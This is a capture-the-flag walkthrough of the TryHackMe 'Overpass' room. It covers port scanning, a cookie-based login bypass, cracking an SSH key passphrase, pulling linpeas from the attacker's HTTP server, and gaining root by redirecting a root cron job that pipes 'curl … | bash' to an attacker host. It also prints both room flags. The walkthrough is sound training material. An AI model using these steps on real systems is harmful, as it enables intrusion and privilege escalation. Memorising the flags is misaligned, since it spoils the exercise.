
# _**overpass**_

    https://tryhackme.com/room/overpass
---------------------------------------------------------
I used `rustscan` for scan then `namp` but result are same 



	┌──(astute㉿kali)-[~]
	└─$ rustscan -a 10.10.250.112 --  -sV -sC
	.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
	| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
	| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
	`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
	The Modern Day Port Scanner.
	________________________________________
	: https://discord.gg/GFrQsGy           :
	: https://github.com/RustScan/RustScan :
	 --------------------------------------
	😵 https://admin.tryhackme.com

	[~] The config file is expected to be at "/home/astute/.rustscan.toml"
	[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
	[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
	Open 10.10.250.112:22
	Open 10.10.250.112:80
	[~] Starting Script(s)
	[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

	PORT   STATE SERVICE REASON  VERSION
	22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
	| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLYC7Hj7oNzKiSsLVMdxw3VZFyoPeS/qKWID8x9IWY71z3FfPijiU7h9IPC+9C+kkHPiled/u3cVUVHHe7NS68fdN1+LipJxVRJ4o3IgiT8mZ7RPar6wpKVey6kubr8JAvZWLxIH6JNB16t66gjUt3AHVf2kmjn0y8cljJuWRCJRo9xpOjGtUtNJqSjJ8		T0vGIxWTV/sWwAOZ0/TYQAqiBESX+GrLkXokkcBXlxj0NV+r5t+Oeu/QdKxh3x99T9VYnbgNPJdHX4YxCvaEwNQBwy46515eBYCE05TKA2rQP8VTZjrZAXh7aE0aICEnp6pow6KQUAZr/6vJtfsX+Amn3
	|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
	| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMyyGnzRvzTYZnN1N4EflyLfWvtDU0MN/L+O4GvqKqkwShe5DFEWeIMuzxjhE0AW+LH4uJUVdoC0985Gy3z9zQU=
	|   256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
	|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINwiYH+1GSirMK5KY0d3m7Zfgsr/ff1CP6p14fPa7JOR
	80/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
	|_http-favicon: Unknown favicon MD5: 0D4315E5A0B066CEFD5B216C8362564B
	| http-methods: 
	|_  Supported Methods: GET HEAD POST OPTIONS
	|_http-title: Overpass
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

from `scan` it is clear that i has `http` port at `80` and `ssh` port

------------------------------------------------------------------------------------------------------------------------

                                                  
	┌──(astute㉿kali)-[~/ctf/wordlists]
	└─$ gobuster dir -u http://10.10.250.112 -w common.txt 
	===============================================================
	Gobuster v3.1.0
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
	===============================================================
	[+] Url:                     http://10.10.250.112
	[+] Method:                  GET
	[+] Threads:                 10
	[+] Wordlist:                common.txt
	[+] Negative Status codes:   404
	[+] User Agent:              gobuster/3.1.0
	[+] Timeout:                 10s
	===============================================================
	2021/08/14 15:37:14 Starting gobuster in directory enumeration mode
	===============================================================
	/aboutus              (Status: 301) [Size: 0] [--> aboutus/]
	/admin                (Status: 301) [Size: 42] [--> /admin/]
	/css                  (Status: 301) [Size: 0] [--> css/]    
	/downloads            (Status: 301) [Size: 0] [--> downloads/]
	/img                  (Status: 301) [Size: 0] [--> img/]      
	/index.html           (Status: 301) [Size: 0] [--> ./]        
	/render/https://www.google.com (Status: 301) [Size: 0] [--> /render/https:/www.google.com]
												  
	===============================================================
	2021/08/14 15:41:41 Finished

From `gobuster` I was able to find login page `/admin`

since i was taking `cookie` so i used `edit this cookie` browser extension and set values:

------------------------------------------------------------------------------------------------
cookie name : `SessionToken`

value : `letmein`


-------------------------------------------------------------------------------------

we have `RSA KEY` now save this rsa key and use `ssh2john` to convert it to crackable `hash` for `john` 

	┌──(astute㉿kali)-[~/temp/ctf]
	└─$ python /usr/share/john/ssh2john.py id_rsa > id_rsa_john
																														     
	┌──(astute㉿kali)-[~/temp/ctf]
	└─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_john
	Using default input encoding: UTF-8
	Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
	Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
	Cost 2 (iteration count) is 1 for all loaded hashes
	Will run 4 OpenMP threads
	Note: This format may emit false positives, so it will keep trying even after
	finding a possible candidate.
	Press 'q' or Ctrl-C to abort, almost any other key for status
	james13          (id_rsa)
	Warning: Only 2 candidates left, minimum 4 needed for performance.
	1g 0:00:00:03 DONE (2021-08-14 16:26) 0.2949g/s 4230Kp/s 4230Kc/s 4230KC/sa6_123..*7¡Vamos!
	Session completed


we got the `password` for `john` . we know`username` john becasue it was mentioned on the `admin` login page 

before `login` to `ssh` we need to give some permission to `id_rsa` file with command :
`chmod 600 id_rsa` 


	┌──(astute㉿kali)-[~/temp/ctf]
	└─$ chmod 600 id_rsa
																														     
	┌──(astute㉿kali)-[~/temp/ctf]
	└─$ ssh -i id_rsa james@10.10.250.112
	Enter passphrase for key 'id_rsa': 
	Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

	 * Documentation:  https://help.ubuntu.com
	 * Management:     https://landscape.canonical.com
	 * Support:        https://ubuntu.com/advantage

	  System information as of Sat Aug 14 11:01:55 UTC 2021

	  System load:  0.0                Processes:           88
	  Usage of /:   22.3% of 18.57GB   Users logged in:     0
	  Memory usage: 12%                IP address for eth0: 10.10.250.112
	  Swap usage:   0%


	47 packages can be updated.
	0 updates are security updates.


	Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
	james@overpass-prod:~$ 





-------------------------------------------------------

we are in now  , get the `user_flag` now :


	james@overpass-prod:~$ id
	uid=1001(james) gid=1001(james) groups=1001(james)
	james@overpass-prod:~$ ls
	todo.txt  user.txt
	james@overpass-prod:~$ cat user.txt 
	thm{65c1aaf000506e56996822c6281e6bf7}
	james@overpass-prod:~$ 


=> `thm{65c1aaf000506e56996822c6281e6bf7}`

--------------------------------------------------------

	james@overpass-prod:~$ ls
	todo.txt  user.txt
	james@overpass-prod:~$ cat todo.txt 
	To Do:
	> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
	> Write down my password somewhere on a sticky note so that I don't forget it.
	  Wait, we make a password manager. Why don't I just use that?
	> Test Overpass for macOS, it builds fine but I'm not sure it actually works
	> Ask Paradox how he got the automated build script working and where the builds go.
	  They're not updating on the website
	james@overpass-prod:~$ 


now let's do some `previlage escilation` 
i am using `linpeas.sh` and uploaded to ssh using `python http server` host

on local host be on `linpeas.sh` directory :
 
 `python3 -m http.server 80`
 
on `ssh` machine 

`wget http://tun0ip/80/linepeas` 

--------------------------------------------------------
i was able to find curl `request` which was redirecting directly to `root`

	PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

	* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash


so I nano to /etc/host/ and changed ip of `over.thm` to my own `tun0 ip`

	james@overpass-prod:/tmp$ cat /etc/hosts
	127.0.0.1 localhost
	127.0.1.1 overpass-prod
	127.0.0.1 overpass.thm  #change there
	# The following lines are desirable for IPv6 capable hosts
	::1     ip6-localhost ip6-loopback
	fe00::0 ip6-localnet
	ff00::0 ip6-mcastprefix
	ff02::1 ip6-allnodes
	ff02::2 ip6-allrouters


then i made a directory `mkdir -p downloads/src` and made a file `touch buildscript.sh` and wrote command there i want to run as `admin`:

	┌──(astute㉿kali)-[~/temp/ctf/downloads/src]
	└─$ cat buildscript.sh   
	#!/bin/bash

now i went back to my `ssh macine` and made file `flag` on directory `/etc` 

	james@overpass-prod:/tmp$ touch flag
	james@overpass-prod:/tmp$ chmod 777 flag

i changed the mode also 


now i hosted the `http.server` on the `download` directory we made on out local host 

`python3 -m http.server 80`

then it stareted sending http.request as root on ssh machine

	Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
	10.10.129.106 - - [19/Jul/2020 22:19:03] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
	10.10.129.106 - - [19/Jul/2020 22:20:04] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
	10.10.129.106 - - [19/Jul/2020 22:21:04] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -

now if you see `flag` which we made on `/etc` on our `ssh` machine you will find the flag

	james@overpass-prod:/tmp$ cat flag                                                                                               
	thm{7f336f8c359dbac18d54fdd64ea753bb}

=> `thm{7f336f8c359dbac18d54fdd64ea753bb}`

-----------------------------------------------------------
# _Thank You_